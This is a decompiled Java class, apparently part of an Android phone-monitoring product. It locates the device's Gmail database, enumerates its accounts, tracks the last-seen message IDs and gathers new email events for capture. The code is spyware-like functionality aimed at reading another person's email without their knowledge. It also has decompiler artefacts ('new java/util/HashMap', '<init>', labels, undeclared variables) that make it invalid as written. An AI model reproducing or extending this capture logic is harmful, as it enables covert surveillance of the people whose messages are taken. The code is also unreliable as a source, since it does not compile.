package com.vvt.capture.email.gmail.b;

import com.vvt.ak.a;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.a.d;
import com.vvt.capture.email.gmail.GmailEventReference;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class e
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private d c;
  private String d;
  private String e;
  
  public e(String paramString)
  {
    this.d = paramString;
  }
  
  public g a()
  {
    bool1 = a;
    if (bool1) {}
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    boolean bool2 = false;
    Object localObject1 = null;
    try
    {
      localObject1 = com.vvt.capture.email.gmail.b.a();
      if (localObject1 == null) {
        break label158;
      }
      try
      {
        Object localObject2 = com.vvt.capture.email.gmail.b.a((String)localObject1);
        Iterator localIterator = ((HashSet)localObject2).iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject2 = localIterator.next();
          localObject2 = (String)localObject2;
          long l = com.vvt.capture.email.gmail.b.a((String)localObject1, (String)localObject2);
          Long localLong = Long.valueOf(l);
          localHashMap.put(localObject2, localLong);
        }
        bool2 = b;
      }
      catch (Exception localException1)
      {
        localObject3 = localObject1;
      }
    }
    catch (Exception localException2)
    {
      for (;;)
      {
        Object localObject3;
        label158:
        bool1 = false;
        Object localObject4 = null;
      }
    }
    if (bool2) {}
    for (;;)
    {
      localObject1 = new com/vvt/capture/email/gmail/GmailEventReference;
      ((GmailEventReference)localObject1).<init>();
      if (localObject3 == null) {
        localObject3 = "";
      }
      ((GmailEventReference)localObject1).setDatabasePath((String)localObject3);
      ((GmailEventReference)localObject1).setReference(localHashMap);
      bool1 = a;
      if (bool1) {}
      return (g)localObject1;
      localObject3 = localObject1;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      String str1 = com.vvt.capture.email.gmail.b.a();
      boolean bool2 = a;
      if (bool2) {}
      bool2 = com.vvt.ag.b.a(str1);
      if (!bool2)
      {
        Object localObject = com.vvt.capture.email.gmail.b.a(str1);
        Iterator localIterator = ((HashSet)localObject).iterator();
        for (;;)
        {
          bool2 = localIterator.hasNext();
          if (!bool2) {
            break;
          }
          localObject = localIterator.next();
          localObject = (String)localObject;
          d locald = this.c;
          String str2 = this.d;
          String str3 = this.e;
          localObject = com.vvt.capture.email.gmail.b.a(str1, (String)localObject, locald, paramInt, str2, str3);
          boolean bool3 = a;
          if (bool3) {}
          localArrayList.addAll((Collection)localObject);
        }
      }
      return localArrayList;
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (bool1) {}
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof GmailEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof GmailEventReference;
      if (!bool1) {}
    }
    for (;;)
    {
      try
      {
        paramg1 = (GmailEventReference)paramg1;
        paramg2 = (GmailEventReference)paramg2;
        HashMap localHashMap = paramg1.getReference();
        String str1 = paramg2.getDatabasePath();
        boolean bool2 = a;
        if ((!bool2) || (str1 != null))
        {
          int i = str1.length();
          if (i > 0)
          {
            Object localObject1 = com.vvt.capture.email.gmail.b.a(str1);
            Iterator localIterator = ((HashSet)localObject1).iterator();
            boolean bool3 = localIterator.hasNext();
            if (bool3)
            {
              localObject1 = localIterator.next();
              localObject1 = (String)localObject1;
              boolean bool4 = localHashMap.containsKey(localObject1);
              if (!bool4) {
                break label245;
              }
              Object localObject2 = localHashMap.get(localObject1);
              localObject2 = (Long)localObject2;
              l = ((Long)localObject2).longValue();
              d locald = this.c;
              String str2 = this.d;
              String str3 = this.e;
              localObject1 = com.vvt.capture.email.gmail.b.a(str1, (String)localObject1, l, locald, str2, str3);
              bool4 = a;
              if (bool4) {}
              localArrayList.addAll((Collection)localObject1);
              continue;
            }
          }
        }
        bool1 = a;
      }
      catch (Exception localException)
      {
        bool1 = b;
        if (!bool1) {}
      }
      if (bool1) {}
      return localArrayList;
      label245:
      long l = 0L;
    }
  }
  
  public void a(d paramd)
  {
    this.c = paramd;
  }
  
  public void a(String paramString)
  {
    this.e = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/removeFromPath/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */